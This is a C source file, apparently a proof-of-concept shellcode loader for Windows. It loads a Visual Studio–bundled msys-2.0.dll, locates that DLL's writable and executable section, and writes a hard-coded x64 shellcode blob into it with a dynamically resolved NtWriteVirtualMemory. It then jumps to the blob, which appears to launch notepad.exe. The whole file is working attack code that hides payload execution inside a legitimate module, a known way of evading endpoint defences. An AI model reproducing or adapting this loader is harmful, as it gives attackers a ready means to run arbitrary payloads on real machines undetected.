#include <stdio.h>
#include <Windows.h>
#include <psapi.h>
#include <dbghelp.h>
#include <ntstatus.h>
#include <winternl.h>

#pragma comment(lib, "Dbghelp.lib")

// calculate the offset to the RWX memory region of a DLL
DWORD_PTR FindRWXOffset(HMODULE hModule)
{
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL)
    {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
        {
            // check if section has RWX permissions
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE))
            {
                DWORD_PTR baseAddress = (DWORD_PTR)hModule;
                DWORD_PTR sectionOffset = sectionHeader->VirtualAddress;
                DWORD_PTR rwxOffset = sectionOffset + baseAddress;
                return rwxOffset;
            }

            sectionHeader++;
        }
    }

    return 0;
}

typedef NTSTATUS(WINAPI* LPfnNtWriteVirtualMemory)
(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
);

int main()
{
    HMODULE hModule = LoadLibraryW(L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll");
    
    printf("[+] Module loaded...\n");

    if (hModule != NULL)
    {
        // calculate offset to loaded DLL RWX memory region
        DWORD_PTR rwxOffset = FindRWXOffset(hModule);

        printf("[+] Offset to RWX memory region: 0x%lx\n", rwxOffset);

        // Shellcode to overwrite the RWX memory region
        unsigned char shellcode[] =
        {
            "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
            "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
            "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
            "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
            "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
            "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
            "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
            "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
            "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
            "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
            "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
            "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
            "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
            "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
            "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
            "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
            "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
            "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
            "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
            "\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00"
        };

        SIZE_T shellcodeSize = sizeof(shellcode);

        // get function address of NtWriteVirtualMemory from ntdll.dll
        LPfnNtWriteVirtualMemory NtWriteVirtualMemoryFunction = (LPfnNtWriteVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtWriteVirtualMemory");

        if (NtWriteVirtualMemoryFunction)
        {
            SIZE_T BytesWritten = 0;

            NTSTATUS status = NtWriteVirtualMemoryFunction
            (
                GetCurrentProcess(),
                (PVOID)rwxOffset,
                shellcode,
                shellcodeSize,
                &BytesWritten
            );

            if (NT_SUCCESS(status))
            {
                printf("[+] Shellcode Written to RWX Memory Region.\n");

                ((void(*)())rwxOffset)();

                printf("[*] Shellcode Executed ");

            }
        }

        // Unload the DLL
        FreeLibrary(hModule);
    }
    else
    {
        printf("Failed to load the DLL.\n");
    }

    return 0;
}